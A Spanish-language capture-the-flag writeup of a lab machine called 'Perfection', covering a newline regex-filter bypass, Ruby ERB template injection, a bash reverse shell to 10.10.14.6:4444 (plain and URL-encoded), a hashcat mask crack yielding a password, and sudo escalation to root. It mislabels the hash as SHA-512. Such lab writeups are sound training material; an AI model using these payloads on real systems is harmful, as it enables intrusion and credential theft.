---
layout: single
title: Perfection Writeup
excerpt: "Perfection es una máquina de dificultad fácil que presenta una aplicación web vulnerable a una Inyección de Plantillas del Lado del Servidor (SSTI) en un entorno Ruby. Tambien se explora una tecnica no tan usual para el descifrado de contraseña empleando la herramienta hashcat."
date: 2025-03-16
classes: wide
header: 
 teaser: /assets/images/Perfection/teaserImage.webp
 teaser_home_page: true
categories: 
 - Linux
 - Easy
tags:
 - Linux
 - Web Application
 - RCE
 - SSTI
 - Password Cracking
 - Reverse engineering
---

# Enumeración

Enumeración de puertos con nmap.

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Basándonos en la versión de **OpenSSH**, podemos inferir que el sistema operativo es **Ubuntu Jammy**.

Información obtenida mediante un escaneo con la herramienta **WhatWeb**

```bash
http://10.10.11.253/ [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx, WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)], IP[10.10.11.253], PoweredBy[WEBrick], Ruby[3.0.2], Script, Title[Weighted Grade Calculator], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block]
```

Durante el escaneo de directorios, no obtuve resultados significativos. Sin embargo, uno de los elementos que llamó mi atención fue el apartado **weighted-grade-calc**, donde se encuentra una calculadora que permite ingresar hasta cinco valores para calcular una nota.

<div style="text-align: center;">
		<img src="/assets/images/Perfection/calculadora.jpg" alt="Clicker-usernamePlayers" width="1000" oncontextmenu="return false;" />
</div>
<br>
El sistema cuenta con ciertas validaciones en el HTML, como la restricción que impide asignar valores superiores a 100 en los campos **Grade** y **Weight**. No obstante, el poder ingresar valores en el campo **Category** representa un potencial vector de explotación, ya que permite el control sobre múltiples entradas de texto. Estas entradas son posteriormente representadas de manera dinámica en la página web.

<div style="text-align: center;">
		<img src="/assets/images/Perfection/dinamicContent.jpg" alt="Clicker-usernamePlayers" width="1000" oncontextmenu="return false;" />
</div>
<br>
Esto sugiere la posible implementación de un motor de plantillas en el backend, lo que podría derivar en una vulnerabilidad de **SSTI (Server-Side Template Injection)**.

# Análisis filtro de entrada

Al enviar solicitudes al repeater de BurpSuite y manipular el parámetro de entrada **category**, observé que solo se permiten caracteres alfanuméricos **(en mayúsculas y minúsculas)**. Cualquier intento de ingresar caracteres especiales genera el siguiente error.

<div style="text-align: center;">
		<img src="/assets/images/Perfection/errorMessage.jpg" alt="Clicker-usernamePlayers" width="1000" oncontextmenu="return false;" />
</div>
<br>
Mediante ingeniería inversa, intenté deducir la expresión regular **(regex)** utilizada para la validación de entrada. Una posible implementación en Ruby podría ser la siguiente.

```ruby
/^[a-zA-Z0-9\/]+$/
```
# Desglose regex

> **`^`** El contenido debe de iniciar con cualquier carácter alfabetico, numeral o el carácter especial / .

> **`[]`** Dentro de este se declaran explicitamente todo el conjunto de caracteres permitidos. Para especificar el carácter /, se usa un backslash primero ya que este también funciona como un delimitador en regex.

> **`+`** Deben de haber una o mas repeticiones del carácter anterior.

> **`$`** Indica el final de la cadena.

Sí no estás muy familiarizado con las expresiones regulares **(regex)** te recomiendo darle un vistazo al siguiente recurso, que en mi opinión lo explican de una manera muy clara, completa y concisa. [Click aqui](https://ruby-for-beginners.rubymonstas.org/advanced/regular_expressions.html)

# Bypass filtro

Sí la validación en el backend realmente utiliza la expresión regular propuesta, podría ser posible evadirla mediante un salto de línea codificado en **URL-ENCODE**, lo que permitiría inyectar caracteres adicionales en una nueva linea sobre la cual no se aplicara la validación.

<div style="text-align: center;">
		<img src="/assets/images/Perfection/regexBypass.jpg" alt="Clicker-usernamePlayers" width="1000" oncontextmenu="return false;" />
</div>
<br>
Para garantizar una validación más estricta, la expresión regular debería estar construida de la siguiente manera.

```ruby
/\A[a-zA-Z0-9\/]+\z/
```

> **`\A`** = Inicio de toda la cadena (no solo línea)  

> **`\z`** = Fin de toda la cadena

Información adicional sobre como funciona este bypass [Click aqui](https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/).

-----

# Explotación

Ya que puedo ingresar cualquier carácter a mi gusto intente ingresar payloads para averiguar que motor de templates esta usando el backend y conseguir un **RCE**. 

Para validar que puedo ejecutar comandos mediante un **SSTI (Server-Side-Template-Injection)** utilice la siguiente lista de payloads [Click aqui](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=ruby#other-ruby).

<div style="text-align: center;">
		<img src="/assets/images/Perfection/listTemplates.jpg" alt="Clicker-usernamePlayers" width="1000" oncontextmenu="return false;" />
</div>
<br>
Ingresando el payload de la siguiente manera.

```ruby
<%= 7*7 %>
```

Encontramos que se genera un error ya que el backend interpreta el símbolo **%** como una codificación errónea.

<div style="text-align: center;">
		<img src="/assets/images/Perfection/codificationError.jpg" alt="Clicker-usernamePlayers" width="1000" oncontextmenu="return false;" />
</div>
<br>
Para evitar esto podremos seleccionar el payload y con **Ctrl+u** convertir a **URL-ENCODE** todos los caracteres especiales.

```url-encode
sdfs%0A<%25%3d+7*7+%25>
```

Otra alternativa es convertir completamente el payload en dicho formato.

```url-encode
sdfs%0A%3c%25%3d%20%37%2a%37%20%25%3e
```

Aquí validamos que estamos ante un **SSTI** ya que se procesa la entrada que ingresamos.

<div style="text-align: center;">
		<img src="/assets/images/Perfection/payloadExecution.jpg" alt="Clicker-usernamePlayers" width="1000" oncontextmenu="return false;" />
</div>
<br>
Ahora entablare una revshell.

```bash
<%= system("bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'") %>
```

```url-encode
%3c%25%3d%20%73%79%73%74%65%6d%28%22%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%36%2f%34%34%34%34%20%30%3e%26%31%27%22%29%20%25%3e
```

<div style="text-align: center;">
		<img src="/assets/images/Perfection/revShell.jpg" alt="Clicker-usernamePlayers" width="1000" oncontextmenu="return false;" />
</div>
<br>
Dando un vistazo al código de la aplicación, para ser mas especifico al fichero **main.rb** encuentro que la regex que se esta aplicando fue construida tal cual como fue planteada en la etapa de enumeración.

<div style="text-align: center;">
		<img src="/assets/images/Perfection/regexMainRb.jpg" alt="Clicker-usernamePlayers" width="1000" oncontextmenu="return false;" />
</div>

----
# Escalada.

Durante el proceso de enumeración encontramos que nuestro usuario actual **susan** pertenece al grupo sudo, por lo que podremos obtener una shell como root mediante el comando **sudo su**.

<div style="text-align: center;">
		<img src="/assets/images/Perfection/susanId.jpg" alt="Clicker-usernamePlayers" width="1000" oncontextmenu="return false;" />
</div>
<br>
En el directorio del usuario susan encontré un recurso que me llamo la atención.

<div style="text-align: center;">
		<img src="/assets/images/Perfection/migrationDir.jpg" alt="Clicker-usernamePlayers" width="1000" oncontextmenu="return false;" />
</div>
<br>
En el cual encontré un fichero y este contiene un hash con lo que parece ser la contraseña de nuestro usuario susan. Este hash es del tipo **SHA-512**.

```bash
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
```

Al tratar de romperlo el hash con varios diccionarios no fue posible, así que obte por enumerar un poco mas.

```bash
find / -user susan -o -group susan 2>/dev/null | grep -vE "proc|home"
```

Encontré un fichero llamado **/var/mail/susan** el cual contiene el siguiente mensaje en donde se especifica como se compone la contraseña del usuarioa actual.

<div style="text-align: center;">
		<img src="/assets/images/Perfection/susanMail.jpg" alt="Clicker-usernamePlayers" width="1000" oncontextmenu="return false;" />
</div>
<br>
Con esto en cuenta podre romper el hash realizando un ataque de **mascara de hash**.

```bash
hashcat -m 1400 -a 3 hash 'susan_nasus_?d?d?d?d?d?d?d?d?d'
```

Finalmente obtengo las contraseña tras romper el hash y ahora simplemente podre realizar login como el usuario **root** mediante el comando **sudo su** ya que el usuario susan pertenece al grupo **sudo**.

<div style="text-align: center;">
	<img src="/assets/images/Perfection/susanCrackHash.jpg" alt="Clicker-usernamePlayers" width="1000" oncontextmenu="return false;" />
</div>
<br>
```bash
susan_nasus_413759210
```

<div style="text-align: center;">
	<img src="/assets/images/Perfection/root.jpg" alt="Clicker-usernamePlayers" width="1000" oncontextmenu="return false;" />
</div>


